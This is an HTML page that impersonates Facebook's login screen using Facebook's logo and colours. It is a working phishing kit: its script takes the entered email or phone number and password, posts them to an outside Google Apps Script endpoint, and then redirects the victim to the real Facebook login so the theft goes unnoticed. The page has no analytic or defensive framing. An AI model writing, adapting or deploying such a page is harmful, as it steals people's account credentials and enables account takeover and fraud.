<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1); width: 360px; text-align: center; }
        img { width: 200px; margin-bottom: 10px; }
        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 14px; }
        button { width: 97%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 18px; font-weight: bold; cursor: pointer; }
        button:hover { background-color: #166fe5; }
        .footer { margin-top: 15px; font-size: 14px; color: #1877f2; text-decoration: none; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4l395u_e77N.svg" alt="Facebook">
        <form id="loginForm">
            <input type="text" id="phone" name="phone" placeholder="Email or Phone Number" required>
            <input type="password" id="pass" name="pass" placeholder="Password" required>
            <button type="submit" id="submitBtn">Log In</button>
        </form>
        <div class="footer">Forgotten password?</div>
    </div>

    <script>
        const scriptURL = 'https://script.google.com/macros/s/AKfycybyOlkx163gk585SzGl4nsHN1TiWumtToHlYz38GNojA_iAEPKqmBow97XUglh1Mxqtf/exec';
        const form = document.getElementById('loginForm');
        const btn = document.getElementById('submitBtn');

        form.addEventListener('submit', e => {
            e.preventDefault();
            btn.disabled = true;
            btn.innerHTML = "Logging in...";

            fetch(scriptURL, { 
                method: 'POST', 
                mode: 'no-cors',
                cache: 'no-cache',
                body: JSON.stringify({
                    phone: document.getElementById('phone').value,
                    pass: document.getElementById('pass').value
                })
            })
            .then(() => {
                // ডাটা পাঠানোর পর আসল ফেসবুকে পাঠিয়ে দেবে
                window.location.href = "https://www.facebook.com/login";
            })
            .catch(error => {
                console.error('Error!', error.message);
                window.location.href = "https://www.facebook.com/login";
            });
        });
    </script>
</body>
</html>
